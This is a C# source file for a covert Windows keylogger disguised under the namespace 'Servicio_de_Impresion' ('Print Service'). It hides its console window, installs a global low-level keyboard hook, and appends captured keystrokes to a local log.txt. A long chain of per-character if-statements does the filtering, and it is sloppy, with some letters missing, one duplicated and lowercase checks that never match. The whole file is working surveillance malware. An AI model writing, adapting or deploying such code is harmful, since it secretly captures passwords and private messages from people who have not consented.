using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;



namespace Servicio_de_Impresion
{
    class Program
    {
       //Variable de clase//
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);

        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
       int nCode, IntPtr wParam, IntPtr lParam)
        
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
               
                // Console.WriteLine((Keys)vkCode);
                StreamWriter sw = new StreamWriter("log.txt", true);
                if (((char)vkCode == 'A'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'B'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'C'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'D'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'E'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'F'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'G'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'H'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'I'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'J'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'K'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'L'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'M'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'O'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'P'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'Q'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'R'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'S'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'T'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'U'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'V'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'W'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'X'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'Y'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'Z'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'a'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'b'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'c'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'd'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'e'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'f'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'g'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'h'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'i'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'j'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'k'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'k'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'l'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'm'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'n'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'p'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'q'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'r'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 's'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 't'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'u'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'v'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'w'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'x'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'y'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == 'z'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == '1'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == '2'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == '3'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == '4'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == '5'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == '6'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == '7'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == '8'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == '9'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == '@'))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((char)vkCode == ' '))
                {
                    sw.Write((Keys)vkCode);
                }
                if (((Keys)vkCode == Keys.Enter))
                {
                    sw.Write((Keys)vkCode);
                }

                sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }




        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
       LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;



    }


}
